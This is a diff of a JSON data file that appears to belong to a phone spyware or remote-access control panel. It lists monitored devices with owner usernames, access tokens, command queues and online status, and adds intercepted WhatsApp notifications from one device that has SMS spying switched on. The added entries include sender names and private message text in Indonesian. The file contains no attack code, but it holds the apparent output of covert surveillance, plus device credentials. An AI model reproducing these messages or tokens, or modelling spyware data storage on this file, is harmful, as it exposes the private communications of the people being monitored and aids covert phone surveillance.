@@ -4,7 +4,7 @@
     "deviceName": "HP-PEW-3BFE",
     "ownerUsername": "Youbie",
     "token": "74be2827eaa044a7872739b517404413",
-    "lastSeen": 1776768323313,
+    "lastSeen": 1776768335414,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T08:57:06.800Z",
@@ -20,6 +20,22 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "‎All Buyer Pegasus-X ( No Update ) (5 pesan): Membalas Anda",
+        "content": "~ WHOHH: jadi gini bang kann ginii nahh pas digituin abis digituin pencet tombol merah bang nanti itu gitu",
+        "time": "21/04 18:45",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776768324733
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎49 pesan dari 28 chat",
+        "time": "21/04 18:45",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776768324719
+      },
       {
         "appName": "WhatsApp",
         "sender": "Adi Wirayuda W",
@@ -9066,7 +9082,7 @@
     "deviceName": "HP-XIINZ-E979",
     "ownerUsername": "abiv12",
     "token": "42f963bfe947d35a7c960fecc604b095",
-    "lastSeen": 1776768323447,
+    "lastSeen": 1776768335942,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T09:50:02.203Z",
@@ -9107,7 +9123,7 @@
     "deviceName": "HP-SISKA_TAMA-3F6F",
     "ownerUsername": "Ubill_raa",
     "token": "e308898150127caeca3b2487066a87c8",
-    "lastSeen": 1776768322517,
+    "lastSeen": 1776768336485,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T10:19:21.483Z",
